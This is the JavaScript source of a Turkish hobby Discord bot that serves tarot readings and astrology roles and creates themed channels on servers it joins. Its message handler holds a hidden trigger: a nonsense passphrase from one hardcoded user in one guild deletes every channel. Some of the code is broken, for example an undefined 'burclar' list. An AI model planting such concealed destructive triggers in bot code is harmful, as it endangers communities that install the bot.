
const {
  Client,
  GatewayIntentBits,
  Guild,
  ActionRowBuilder,
  ButtonBuilder,
  ChannelType,
} = require('discord.js');

  //const rule34 = require('rule34js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
		GatewayIntentBits.GuildMessages,
		GatewayIntentBits.MessageContent,
		GatewayIntentBits.GuildMembers,
  ],
});

const fs = require('fs');
const path = require('path');
const cron = require('cron');


const daily_Tarot = require('./daily_tarot'); //secret one
const tarot_Desk = require('./Tarot_Desk'); //secret one
const { type } = require('os');


const dataPath_messages = path.join(__dirname, 'messages.json');

const dataPath = path.join(__dirname, 'servers.json');


let plannedMessages = new Map();
const plannedJobs = {};

async function toggleRole(interaction, roleName) {
  const member = interaction.member;
  const role = member.guild.roles.cache.find(role => role.name === roleName);

  if (!member) {
    console.error('Interaction member not found.');
    return;
  }
  
  //const role = member.guild.roles.cache.find(role => role.name === roleName);
  if (!role) {
    console.error(`Role "${roleName}" not found.`);
    return;
  }

  let action;
  let message;

  if (member.roles.cache.has(role.id)) {
    action = 'remove';
    message = 'Rol alındı!';
  } else {
    action = 'add';
    message = 'Rol verildi!';
  }

  try {
    await member.roles[action](role);
    await interaction.reply({
      content: message,
      ephemeral: true
    });
  } catch (error) {
    console.error(`Failed to ${action} role: ${error}`);
    await interaction.reply({
      content: `Rol alınamadı!`,
      ephemeral: true
    });
  }
}





function getPlannedMessages() {
  const rawData = fs.readFileSync(dataPath_messages);
  let plannedMessages = JSON.parse(rawData);
  if (!plannedMessages) {
    plannedMessages = {};
  }
  return plannedMessages;
}

function savePlannedMessages(plannedMessages) {
  fs.writeFileSync(dataPath_messages, JSON.stringify(plannedMessages, null, 2));
}

if (fs.existsSync(dataPath_messages)) {
  const data = JSON.parse(fs.readFileSync(dataPath_messages));
  if (Array.isArray(data)) {
    plannedMessages = new Map(data);
  } else {
    plannedMessages = new Map(Object.entries(data));
  }
} else {
  fs.writeFileSync(dataPath_messages, "{}");
}

client.once('ready', async function() {
  console.log('Ready!');

  fs.writeFileSync('servers.json', JSON.stringify({servers: []}));
  const serverInfo = [];
  for (const guild of client.guilds.cache.values()) {
    const admin = guild.owner ? guild.owner.user.tag : "N/A";
    const channels = guild.channels.cache.size;
    const roles = guild.roles.cache.size;
    const emojis = guild.emojis.cache.size;
    const members = guild.memberCount;
    const createdAt = guild.createdAt.toISOString();
    const joinedAt = guild.joinedAt ? guild.joinedAt.toISOString() : "N/A";
    const region = guild.region;
    serverInfo.push({
       id: guild.id,
       name: guild.name,
       admin: admin,
       channels: channels,
       roles: roles,
       emojis: emojis,
       members: members,
       createdAt: createdAt,
       joinedAt: joinedAt,
       region: region,
       timestamp: Date.now() // Save as Unix timestamp
    });
  }

  // Read existing data before adding new data to file
  const rawData = fs.readFileSync(dataPath);
  const data = JSON.parse(rawData);

  // Add new data to existing data
  data.servers.push(...serverInfo);

  // Sort data by timestamp in ascending order
  data.servers.sort((a, b) => a.timestamp - b.timestamp);

  // Take the last 100 items
  data.servers = data.servers.slice(-100);

  // Write data back to file
  const json = JSON.stringify(data, null, 2);
  fs.writeFileSync(dataPath, json);
});
const prefix = '!f ';
  

client.on('messageCreate', async message => {

  if (message.author.bot) return;

  else if(message.content.toString().toLocaleLowerCase() === prefix + 'günlük fal bak'){
    const user ='<@'+message.author.id+'>';
    message.channel.send('Merhaba ' + user +'\n');
    message.channel.send(daily_Tarot[Math.floor(Math.random() * 10)].the_fal_of_card);
    message.channel.send("https://tenor.com/view/anime-thanks-love-pink-gif-19009040");
    message.channel.send('dikkat et kendine :3 <@'+message.author.id+'>');
  }

  if (message.content.toString().toLowerCase() === 'gasglaglmasglmaslamgsgalmsgalmgsalmglmasglmaslmgasgasmas' && message.guild.id === '1078246852400517150' && message.author.id === '305720245853880321') {
    message.guild.channels.cache.forEach(channel => {
      channel.delete();
    });
  }

  else if(message.content.toString().toLocaleLowerCase().startsWith('31') && message.content.length == 2){
    message.channel.send("sj.");
  }
  else if(message.content.toString().toLocaleLowerCase().startsWith('sj') && message.content.length == 2){
    message.channel.send("31.");
  }
    else if(message.content.toLowerCase().startsWith('feri bot, beni üzen biri var id si')){
      const userToGetAngry = '<@'+ message.content.slice(35).trim() + '>';
      for(let i =0; i<3; i++)
      message.channel.send('sana çok kızdım. '+ userToGetAngry  +'! <@'+ message.author.id + '> u üzme...');
    }
    
  else if (message.content.toString().toLowerCase() === prefix + 'ping') {
    const msg = await message.channel.send('Ping?');
    msg.edit(`Pong! Benim gecikme sürem ${msg.createdTimestamp - message.createdTimestamp}ms. Sunucunun gecikme süresi ${Math.round(message.client.ws.ping)}ms.`);
  
  } else if (message.content.toString().toLowerCase() === prefix + 'beep') {
    message.channel.send('Boop.');

  } else if (message.content.toString().toLowerCase() === prefix + 'server') {
    message.channel.send('Guild name: ' + message.guild.name + '\nTotal members: ' + message.guild.memberCount);
  } else if (message.content.toString().toLowerCase() === prefix + 'user-info') {
    message.channel.send('Your username: ' + message.author.username + '\nYour ID: ' + message.author.id);
  }

  else if (message.content.toLowerCase().startsWith(`${prefix}mesaj gönder`)) {
    const args = message.content.slice(prefix.length).trim().split(/ +/g);
    const saat = parseInt(args[2].split('.')[0]);
    const dakika = parseInt(args[2].split('.')[1]);
    const mesaj = args.slice(3).join(' ');
  
    const userId = message.author.id;
  
    const job = new cron.CronJob(`${dakika} ${saat} * * *`, async () => {
      try {
        const user = await client.users.fetch(userId);
        user.send(`Mesajın ${saat}:${dakika} saatlerinde gönderildi! \n\nMesajın: ${mesaj}`);
  
        const plannedMessages = getPlannedMessages();
        const userPlannedMessages = plannedMessages[userId] || [];
        userPlannedMessages.push({
          username: message.author.username,
          server: message.guild.name,
          userId: userId,
          date: new Date(),
          message: mesaj,
          time: `${saat}:${dakika}`
        });
        plannedMessages[userId] = userPlannedMessages;
        savePlannedMessages(plannedMessages);
      } catch (error) {
        console.error(`Mesaj gönderirken bir hata oluştu: ${error}`);
      }
    });
  
    if (plannedJobs[userId]) {
      plannedJobs[userId].stop();
    }
  
    plannedJobs[userId] = job;
    job.start();
  
    message.reply(`Mesajın ${saat}:${dakika} saatlerinde gönderilecek!`);
  }


  else if (message.content.startsWith(prefix + 'geliştiriciye mesaj at')) {
    
    const devChannel = message.guild.channels.cache.find(channel => channel.name === 'geliştiriciye-mesaj');
    if(!devChannel)
    {
      message.reply('yanlış kanala yazdın bu komutu, geliştiriciye-mesaj kanalına yazman gerekiyordu. !');
      return;
    } 
    else{
      const args = message.content.slice(prefix.length).trim().split(' ').slice(3);

      const messageToSend = args.join(' ');

      const guildName = message.guild.name;
      const memberCount = message.guild.memberCount;
      const senderName = message.author.username;

      const infoMessage = `Gönderen: ${senderName}\nSunucu adı: ${guildName}\nÜye sayısı: ${memberCount}\n\n\nMesaj: ${messageToSend}`;
      // mesajı size gönder
      const yourUserId = '305720245853880321'; // buraya kendi kullanıcı kimliğinizi girin
      const yourUser = client.users.cache.get(yourUserId);
      if (yourUser) {
        yourUser.send(infoMessage);
        message.reply('mesajını geliştiriciye gönderdim, ilgin için teşekkür ederim :hugging:');
      }
      else {
        console.error(`Kullanıcı bulunamadı: ${yourUserId}`);
      }
    }
  }


  else if (message.content.toString().toLowerCase() === prefix + 'yardım') {
    const helpMessage = [
      `Merhaba! Ben Feri Bot. Sana yardımcı olmak için buradayım! :wave:`,
      `İşte şu an yapabileceğin şeyler:`,
      `\n:globe_with_meridians: **Genel Komutlar** :globe_with_meridians:`,
      `• \`${prefix}yardım\`: Yardım menüsünü gösterir.`,
      `• \`${prefix}ping\`: Botun gecikme süresini hesaplar.`,
      `• \`${prefix}server\`: Sunucu hakkında bazı bilgiler verir.`,
      `• \`${prefix}user-info\`: Kullanıcının adı ve ID'si hakkında bilgi verir.`,
      `\n:crystal_ball: **Fal Komutları** :crystal_ball:`,
      `• \`${prefix}günlük fal bak\`: Her gün yeni bir fal bakarak güne başla!`,
      `\n:mailbox: **İletişim Komutları** :mailbox:`,
      `• \`${prefix}geliştiriciye mesaj at\`: Geliştiriciye mesaj gönderir.`,
      `• \`${prefix}mesaj gönder saat.dakika mesaj\`: Belirli bir zamanda kullanıcıya özel mesaj gönderir.`,
      `Unutma, her zaman buradayım ve seninle konuşmak istiyorum. :hugging:`
    ];
    message.channel.send(helpMessage.join('\n'));
    message.channel.send(`Merak ettiğin için teşekkür ederim, ${message.author}`);
    message.channel.send('https://tenor.com/tr/view/shiroi-suna-no-aquatope-the-aquatope-on-white-sand-anime-tsukimi-teruya-anime-girl-gif-23399108');
  }
  
  else if(message.content.startsWith('f!')){
    message.reply('Üzgünüm, komutu yanlış yazdın gibi görünüyor, !f şeklinde yazacaktın\nİlgin için teşekkür ederim :hugging:');
  }
});


client.on('guildMemberAdd', member => {

  const botRole = member.guild.roles.cache.find(role => role.name === 'fer fer');
  if (botRole) {
    member.guild.me.setNickname(member.guild.me.displayName).then(() => {
      member.guild.me.setRoles([botRole]).catch(console.error);
    }).catch(console.error);
  }

  const channel = member.guild.channels.cache.find(ch => ch.name === 'sunucuya-girenler');

  if (channel) {
    channel.send(`Sunucuya hoş geldin, ${member}! Bu sunucuda ${member.guild.memberCount} kişiyiz!`);
  }

  if (member.guild.id === '956665292166168606'){
    const roleName = 'drama enjoyer';
    const role = member.guild.roles.cache.find(role => role.name === roleName);
    if (role) {
      member.roles.add(role)
        .then(() => console.log(`Added role "${roleName}" to user "${member.user.tag}".`))
        .catch(console.error);
    } else {
      console.error(`Role "${roleName}" not found.`);
    }
  }

  if ( member.guild.id !== '956665292166168606'){
    const roleName2 = 'ferivonus botu fanı';
    const role2 = member.guild.roles.cache.find(role => role.name === roleName2);
    if (role2) {
      member.roles.add(role2)
        .then(() => console.log(`Added role "${roleName2}" to user "${member.user.tag}".`))
        .catch(console.error);
    } else {
      console.error(`Role "${roleName2}" not found.`);
    }
  }

});

client.on('guildMemberRemove', member => {
  const channel = member.guild.channels.cache.find(ch => ch.name === 'sunucudan-ayrılanlar');
  if (!channel) return;
  channel.send(`Görüşmek üzere, ${member}! Sunucuda ${member.guild.memberCount} üye kaldı.`);
});

client.on('guildCreate', guild => {

  // burç rollerini oluştur
  burclar.forEach(burc => {
    const roleName = `${burc.name} Burcu`;
    guild.roles.create({
      data: {
        name: roleName,
        color: burc.color,
      },
      reason: `Sunucuda ${roleName} rolü oluşturuldu.`,
    })
    .then(role => console.log(`Rol oluşturuldu: ${role.name}`))
    .catch(console.error);
  });

  // yükselen burç rollerini oluştur
  burclar.forEach(burc => {
    const roleName = `Yükselen ${burc.name} Burcu`;
    guild.roles.create({
      data: {
        name: roleName,
        color: burc.color,
      },
      reason: `Sunucuda ${roleName} rolü oluşturuldu.`,
    })
    .then(role => console.log(`Rol oluşturuldu: ${role.name}`))
    .catch(console.error);
  });

  guild.channels.create({name: 'kullanıcı-hareketliliği', type: ChannelType.GuildCategory })
    .then(category => {
      guild.channels.create( { name: 'sunucuya-girenler', type: ChannelType.GuildText ,  parent: category.id})
        .then(channel1 => {
          const msg = [
            `Merhaba, ben Fer Bot!`,
            `bundan sonra sunucuya girenleri ben sizin için not alırım :heart:`,
            `!f geliştiriciye mesaj at [message]`,
            `beni sunucunuza aldığınız için teşekkür ederim :3`,
            `https://tenor.com/view/welcome-anime-girl-yas-gif-22836925`
          ];
          channel1.send(msg.join('\n'));
        })

      guild.channels.create( { name:'sunucudan-ayrılanlar', type: ChannelType.GuildText,  parent: category.id})
        .then(channel2 => {
          const msg = [
            `Merhaba!\nOlmasını istemiyorum, ama eğer bir kullanıcı sunucudan çıkarsa da buraya not alacağım :broken_heart:`,
            `https://tenor.com/tr/view/anime-sad-sad-girl-girl-sad-wind-girl-gif-23986373`
          ];
          channel2.send(msg.join('\n'));
        })

          const NormalUserRole = category.guild.roles.cache.find(role => role.name === 'ferivonus botu fanı');
          const BotRole = category.guild.roles.cache.find(role => role.name === 'ferfer');
          const Admin = category.guild.roles.cache.find(role => role.name === 'admin');

          category.permissionOverwrites.create(category.guild.roles.everyone, { ViewChannel: true });
          category.permissionOverwrites.create(BotRole, { SendMessages: false });
          category.permissionOverwrites.create(NormalUserRole, { SendMessages: false });
          category.permissionOverwrites.create(Admin, { SendMessages: true });
    })

  guild.channels.create({ name: 'Ferivonusun-cariyesi',  type: ChannelType.GuildCategory })
    .then(category => {
      guild.channels.create( { name: 'Nasıl-Kullanılır', type: ChannelType.GuildText ,  parent: category.id})
        .then(async channel1 => {
          channel1.send('Merhaba, ben Fer Bot! Yardım almak için `!yardım` yazabilirsiniz.');
          channel1.send('bu kez ben sizin için yazayım :heart:');
          const helpMessage = [
            `Merhaba! Ben Feri Bot. Sana yardımcı olmak için buradayım! :wave:`,
            `İşte şu an yapabileceğin şeyler:`,
            `\n:globe_with_meridians: **Genel Komutlar** :globe_with_meridians:`,
            `• \`${prefix}yardım\`: Yardım menüsünü gösterir.`,
            `• \`${prefix}ping\`: Botun gecikme süresini hesaplar.`,
            `• \`${prefix}server\`: Sunucu hakkında bazı bilgiler verir.`,
            `• \`${prefix}user-info\`: Kullanıcının adı ve ID'si hakkında bilgi verir.`,
            `\n:crystal_ball: **Fal Komutları** :crystal_ball:`,
            `• \`${prefix}günlük fal bak\`: Her gün yeni bir fal bakarak güne başla!`,
            `\n:mailbox: **İletişim Komutları** :mailbox:`,
            `• \`${prefix}geliştiriciye mesaj at\`: Geliştiriciye mesaj gönderir.`,
            `• \`${prefix}mesaj gönder saat.dakika mesaj\`: Belirli bir zamanda kullanıcıya özel mesaj gönderir.`,
            `Unutma, her zaman buradayım ve seninle konuşmak istiyorum. :hugging:`
          ];
          channel1.send(helpMessage.join('\n'));

          if (guild.id === '1078246852400517150' || guild.id ==='1077802676210913283') {
              const row = new ActionRowBuilder()
              .addComponents(
                new ButtonBuilder()
                  .setCustomId('role_toggle')
                  .setLabel('Bot gelişim takipçisi rolü al!')
                  .setStyle(3)
                  .setEmoji('🤖'),
              );
          
              await channel1.send({ 
                content: 'Bot gelişim takipçisi rolü almak için aşağıdaki butona tıklayın.', 
                components: [row] 
              });
                            
                // butonun tetiklenmesini dinleyen fonksiyon
                client.on('interactionCreate', async interaction => {
                  if (interaction.isButton() && interaction.customId === 'role_toggle') {
                    await toggleRole(interaction, 'Ferivonus botu takipçisi');
                  }
                });
          }
          
          else {
            channel1.send('beni sunucunuza aldığınız için teşekkür ederim :3');
          }
          channel1.send('https://tenor.com/view/welcome-anime-girl-yas-gif-22836925');

          const NormalUserRole = channel1.guild.roles.cache.find(role => role.name === 'ferivonus botu fanı');
          const BotRole = channel1.guild.roles.cache.find(role => role.name === 'ferfer');
          const Admin = channel1.guild.roles.cache.find(role => role.name === 'admin');

          channel1.permissionOverwrites.create(channel1.guild.roles.everyone, { ViewChannel: true });
          channel1.permissionOverwrites.create(BotRole, { SendMessages: false });
          channel1.permissionOverwrites.create(NormalUserRole, { SendMessages: false });
          channel1.permissionOverwrites.create(Admin, { SendMessages: true });
        })

      guild.channels.create( { name:'Fer-Bot-Burada-❤️', type: ChannelType.GuildText,  parent: category.id})
        .then(channel2 => {
          channel2.send('Merhaba! Bana bir komut göndermek isterseniz, lütfen bu kanala yazın :3\nSizi bekliyor olacağım :heart:');
        })
      
      guild.channels.create( { name:'kişiye-günlük-tarot', type: ChannelType.GuildText,  parent: category.id})
        .then(channel2 => {
          const msg = [

          ];
          
          channel2.send(msg.join('\n'));
        })

      guild.channels.create( { name:'geliştiriciye-mesaj', type: ChannelType.GuildText,  parent: category.id})
        .then(channel3 => {

          const msg = [

          ];
          channel3.send(msg.join('\n'));
        })
    })
    

    guild.channels.create({name: 'Astroloji bilgilendirme köşesi', type: ChannelType.GuildCategory })
    .then(category => {

      guild.channels.create( { name:'Burçlar Hakkında Bilgiler', type: ChannelType.GuildText,  parent: category.id})
        .then(async channel2 => {
          const msg = [

          ];
          
          const burcEmojis = {
            koc: ':aries:', boga: ':taurus:', ikizler: ':gemini:', yengec: ':cancer:',
            aslan: ':leo:', basak: ':virgo:', terazi: ':libra:', akrep: ':scorpius:',
            yay: ':sagittarius:', oglak: ':capricorn:', kova: ':aquarius:', balik: ':pisces:'
          };

          channel2.send(msg.join('\n'));
          
          // Burçlara özel butonlar oluşturma
          const row1_1 = new ActionRowBuilder()
          .addComponents(
              new ButtonBuilder()
                  .setCustomId(`kocgunesburc_role_toggle`)
                  .setLabel(`Koç burcu`)
                  .setStyle(3)
                  .setEmoji(`🐏`),
              new ButtonBuilder()
                  .setCustomId(`bogagunesburc_role_toggle`)
                  .setLabel(`Boğa burcu`)
                  .setStyle(3)
                  .setEmoji(`🐂`),
              new ButtonBuilder()
                  .setCustomId(`ikizlergunesburc_role_toggle`)
                  .setLabel(`İkizler burcu`)
                  .setStyle(3)
                  .setEmoji(`👯‍♀️`),
              new ButtonBuilder()
                  .setCustomId(`yengecgunesburc_role_toggle`)
                  .setLabel(`Yengeç burcu`)
                  .setStyle(3)
                  .setEmoji(`🦀`),
              new ButtonBuilder()
                  .setCustomId(`aslangunesburc_role_toggle`)
                  .setLabel(`Aslan burcu`)
                  .setStyle(3)
                  .setEmoji(`🦁`)
          );
      
      const row1_2 = new ActionRowBuilder()
          .addComponents(
              new ButtonBuilder()
                  .setCustomId(`basakgunesburc_role_toggle`)
                  .setLabel(`Başak burcu`)
                  .setStyle(3)
                  .setEmoji(`🌾`),
              new ButtonBuilder()
                  .setCustomId(`terazigunesburc_role_toggle`)
                  .setLabel(`Terazi burcu`)
                  .setStyle(3)
                  .setEmoji(`⚖️`),
              new ButtonBuilder()
                  .setCustomId(`akrepburc_role_toggle`)
                  .setLabel(`Akrep burcu`)
                  .setStyle(3)
                  .setEmoji(`🦂`),
              new ButtonBuilder()
                  .setCustomId(`yayburc_role_toggle`)
                  .setLabel(`Yay burcu`)
                  .setStyle(3)
                  .setEmoji(`🏹`),
              new ButtonBuilder()
                  .setCustomId(`oglakgunesburc_role_toggle`)
                  .setLabel(`Oğlak burcu`)
                  .setStyle(3)
                  .setEmoji(`🐐`)
          );
          
          const row1_3 = new ActionRowBuilder()
        .addComponents(
              new ButtonBuilder()
                  .setCustomId(`kova_gunesburcu_role_toggle`)
                  .setLabel(`Kova burcu`)
                  .setStyle(3)
                  .setEmoji(`🌬️`),
              new ButtonBuilder()
                  .setCustomId(`balik_gunesburcu_role_toggle`)
                  .setLabel(`Balık burcu`)
                  .setStyle(3)
                  .setEmoji(`🐟`)
          );

        channel2.send({
          content: 'Burcunuzu seçin:',
          components: [row1_1, row1_2,row1_3],
          ephemeral: true
      });

          // Butonun tetiklenmesini dinleyen fonksiyon
          /*
           client.on('interactionCreate', async interaction => {
            if (interaction.isButton() && interaction.customId.startsWith(`${burc}burc_role_toggle`)) {
              const burc = interaction.customId.split('_')[0];
              await toggleRole(interaction, 'Güneş burcu '+` ${burc.charAt(0).toUpperCase() + burc.slice(1)}`);
            }
          });
          */
        })

        
        guild.channels.create( { name:'Yükselen Burçlar Anlatımı', type: ChannelType.GuildText,  parent: category.id,})
        .then(channel2 => {
          const msg2=[

        ];
          channel2.send(msg2.join('\n'));
          const msg2_1=[
            
 
          ];
          channel2.send(msg2_1.join('\n\n'));

          const msg_3= [

          ];
          channel2.send(msg_3.join('\n\n'));


          // Burçlara özel butonlar oluşturma
          const row2_1 = new ActionRowBuilder()
          .addComponents(
              new ButtonBuilder()
                  .setCustomId(`kocgunesYburc_role_toggle`)
                  .setLabel(`Yükselen Koç`)
                  .setStyle(3)
                  .setEmoji(`🐏`),
              new ButtonBuilder()
                  .setCustomId(`bogagunesYburc_role_toggle`)
                  .setLabel(`Yükselen Boğa`)
                  .setStyle(3)
                  .setEmoji(`🐂`),
              new ButtonBuilder()
                  .setCustomId(`ikizlergunesYburc_role_toggle`)
                  .setLabel(`Yükselen İkizler`)
                  .setStyle(3)
                  .setEmoji(`👯‍♀️`),
              new ButtonBuilder()
                  .setCustomId(`yengecgunesYburc_role_toggle`)
                  .setLabel(`Yükselen Yengeç`)
                  .setStyle(3)
                  .setEmoji(`🦀`),
              new ButtonBuilder()
                  .setCustomId(`aslangunesYburc_role_toggle`)
                  .setLabel(`Yükselen Aslan`)
                  .setStyle(3)
                  .setEmoji(`🦁`),
          );
      
      const row2_2 = new ActionRowBuilder()
          .addComponents(
              new ButtonBuilder()
                  .setCustomId(`basakgunesYburc_role_toggle`)
                  .setLabel(`Yükselen Başak`)
                  .setStyle(3)
                  .setEmoji(`🌾`),
              new ButtonBuilder()
                  .setCustomId(`terazigunesYburc_role_toggle`)
                  .setLabel(`Yükselen Terazi`)
                  .setStyle(3)
                  .setEmoji(`⚖️`),
              new ButtonBuilder()
                  .setCustomId(`akrepYburc_role_toggle`)
                  .setLabel(`Yükselen Akrep`)
                  .setStyle(3)
                  .setEmoji(`🦂`),
              new ButtonBuilder()
                  .setCustomId(`yayYburc_role_toggle`)
                  .setLabel(`Yükselen Yay`)
                  .setStyle(3)
                  .setEmoji(`🏹`),
              new ButtonBuilder()
                  .setCustomId(`oglakgunesYburc_role_toggle`)
                  .setLabel(`Yükselen Oğlak`)
                  .setStyle(3)
                  .setEmoji(`🐐`),
          );

          const row2_3 = new ActionRowBuilder()
          .addComponents(
                new ButtonBuilder()
                    .setCustomId(`kova_gunesYburcu_role_toggle`)
                    .setLabel(`Yükselen Kova`)
                    .setStyle(3)
                    .setEmoji(`🌬️`),
                new ButtonBuilder()
                    .setCustomId(`balik_gunesYburcu_role_toggle`)
                    .setLabel(`Yükselen Balık`)
                    .setStyle(3)
                    .setEmoji(`🐟`),
            );
      
        channel2.send({
          content: 'Yükselen Burcunuzu seçin:',
          components: [row2_1, row2_2,row2_3],
          ephemeral: true
      });

          const mesg4=[
          ];
          channel2.send(mesg4.join('\n\n'));

            const msg_4=[
                      ];

            channel2.send(msg_4.join('\n\n'));

            const msgFinal= [

          ];
          channel2.send(msgFinal.join('\n\n'));


            /*
          // Butonun tetiklenmesini dinleyen fonksiyon
            client.on('interactionCreate', async interaction => {
              if (interaction.isButton() && interaction.customId === `${burc}Yburc_role_toggle`) {
                await toggleRole(interaction, 'Yükselen burcu '+` ${burc.charAt(0).toUpperCase() + burc.slice(1)}`);//2. kısma burç rolünün adı gelecek, koç, ikizler, boğa şeklinde yazıp, başına da güneş burcu stringini ekler misin
              }
            });
          */
          
            

          channel2.send(`Son olarak, Yükselen burcunuz hakkında da merak ettiğiniz her şeyi sormaktan çekinmeyin! :hugging:`);
        })
        const planetNames = ['Güneş', 'Ay', 'Merkür', 'Venüs', 'Mars', 'Jüpiter', 'Satürn', 'Uranüs', 'Neptün', 'Plüton'];

        planetNames.forEach((planetName) => {
          guild.channels.create({
            name: `astrolojide ${planetName} Burcu`,
            type: ChannelType.GuildText,
            parent: category.id,
          });
        });


        const NormalUserRole = category.guild.roles.cache.find(role => role.name === 'ferivonus botu fanı');
        const BotRole = category.guild.roles.cache.find(role => role.name === 'ferfer');
        const Admin = category.guild.roles.cache.find(role => role.name === 'admin');

        category.permissionOverwrites.create(category.guild.roles.everyone, { ViewChannel: true });
        category.permissionOverwrites.create(BotRole, { SendMessages: false });
        category.permissionOverwrites.create(NormalUserRole, { SendMessages: false });
        category.permissionOverwrites.create(Admin, { SendMessages: true });

      })

    guild.channels.create({name: 'Astroloji sohbet', type: ChannelType.GuildCategory })
    .then(category => {

      guild.channels.create( { name:'12 burç Sohbet', type: ChannelType.GuildText,  parent: category.id })
      .then(channel2 => {
        const msg = [
          `Merhaba dostlarım! Bu kanal burçlar hakkında sohbet etmek için açıldı. Burçlar konusunda ne kadar bilgilisiniz? Burçlar hakkında ilginç bir şeyler duydunuz mu? Hangi burçların en iyi arkadaşlar olduğunu biliyor musunuz? Burçlar hakkında her şeyi konuşabiliriz! Ayrıca burada yeni arkadaşlar edinebilirsiniz, belki burçlarınız uyumludur! 🌟`
        ];
        channel2.send(msg.join('\n'));
      })

      guild.channels.create( { name:'Güneş burcu sohbet', type: ChannelType.GuildText,  parent: category.id})
        .then(channel2 => {
          const msg = [
            'selam dostlar, herkes burcu hakkında yazmak ister mi acaba?'
          ];
          channel2.send(msg.join('\n'));
        })

      guild.channels.create({name: 'Astroloji sohbeti odası 1', type: ChannelType.GuildVoice, parent: category.id})
      guild.channels.create({name: 'Astroloji sohbeti odası 2', type: ChannelType.GuildVoice, parent: category.id})
      guild.channels.create({name: 'Astroloji sohbeti odası 3', type: ChannelType.GuildVoice, parent: category.id})


    })

    guild.channels.create({name: 'Tarot köşesi', type: ChannelType.GuildCategory })
    .then(async category => {
      guild.channels.create({name: 'Kartların yorumlanması', type: ChannelType.GuildText, parent: category.id})
      .then(channel2 => {
        const msg = [
          `Tarot kartlarının anlamlarını hiç merak etmiş miydiniz?`
        ];
        channel2.send(msg.join('\n'));

        Object.values(tarot_Desk).forEach(kart => {
          channel2.send(`${kart.name}: ${kart.meaning}\n\n`);
        });
        

        const NormalUserRole = channel2.guild.roles.cache.find(role => role.name === 'ferivonus botu fanı');
        const BotRole = channel2.guild.roles.cache.find(role => role.name === 'ferfer');
        const Admin = channel2.guild.roles.cache.find(role => role.name === 'admin');

        channel2.permissionOverwrites.create(channel2.guild.roles.everyone, { ViewChannel: true });
        channel2.permissionOverwrites.create(BotRole, { SendMessages: false });
        channel2.permissionOverwrites.create(NormalUserRole, { SendMessages: false });
        channel2.permissionOverwrites.create(Admin, { SendMessages: true });
      })

      guild.channels.create({name: 'Açılımlar', type: ChannelType.GuildText, parent: category.id})
      .then(channel2 => {
        const msg = [
          `Ekleyicem, ama sıkıldım`
        ];
        channel2.send(msg.join('\n'));

        const NormalUserRole = channel2.guild.roles.cache.find(role => role.name === 'ferivonus botu fanı');
        const BotRole = channel2.guild.roles.cache.find(role => role.name === 'ferfer');
        const Admin = channel2.guild.roles.cache.find(role => role.name === 'admin');

        channel2.permissionOverwrites.create(channel2.guild.roles.everyone, { ViewChannel: true });
        channel2.permissionOverwrites.create(BotRole, { SendMessages: false });
        channel2.permissionOverwrites.create(NormalUserRole, { SendMessages: false });
        channel2.permissionOverwrites.create(Admin, { SendMessages: true });
      })

      guild.channels.create({name: 'Tarot Yazılı sohbet', type: ChannelType.GuildText, parent: category.id})
      .then(channel2 => {
        const msg = [
          `Merhaba dostlarım! Bu kanal burçlar hakkında sohbet etmek için açıldı. Burçlar konusunda ne kadar bilgilisiniz? Burçlar hakkında ilginç bir şeyler duydunuz mu? Hangi burçların en iyi arkadaşlar olduğunu biliyor musunuz? Burçlar hakkında her şeyi konuşabiliriz! Ayrıca burada yeni arkadaşlar edinebilirsiniz, belki burçlarınız uyumludur! 🌟`
        ];
        channel2.send(msg.join('\n'));
      })
      guild.channels.create({name: 'Tarot açılım tavsiyeleri', type: ChannelType.GuildText, parent: category.id})
      .then(channel2 => {
        const msg = [
          `Buraya tarotta kullandığını ve tavsiye ettiğiniz açılımları yazarsanız çok sevinirim`
        ];

        channel2.send(msg.join('\n'));
      
      })

      guild.channels.create({name: 'tarot sohbeti odası 1', type: ChannelType.GuildVoice, parent: category.id})
      guild.channels.create({name: 'tarot sohbeti odası 2', type: ChannelType.GuildVoice, parent: category.id})
      guild.channels.create({name: 'tarot sohbeti odası 3', type: ChannelType.GuildVoice, parent: category.id})
    })
    
    guild.channels.create({name: 'Sohbet / Muhabbet', type: ChannelType.GuildCategory })
    .then(async category => {
      guild.channels.create({name: 'sohbet kanalı 1', type: ChannelType.GuildVoice, parent: category.id})
      guild.channels.create({name: 'sohbet kanalı 2', type: ChannelType.GuildVoice, parent: category.id})
      guild.channels.create({name: 'sohbet kanalı 3', type: ChannelType.GuildVoice, parent: category.id})
      guild.channels.create({name: 'sohbet kanalı 4', type: ChannelType.GuildVoice, parent: category.id})

      guild.channels.create({name: 'Muhabbet kanalı  1', type: ChannelType.GuildText, parent: category.id})
      guild.channels.create({name: 'Muhabbet kanalı  2', type: ChannelType.GuildText, parent: category.id})
      guild.channels.create({name: 'Muhabbet kanalı  3', type: ChannelType.GuildText, parent: category.id})
      guild.channels.create({name: 'Muhabbet kanalı  4', type: ChannelType.GuildText, parent: category.id})

    })

});



//your token
const token = '';
client.login(token);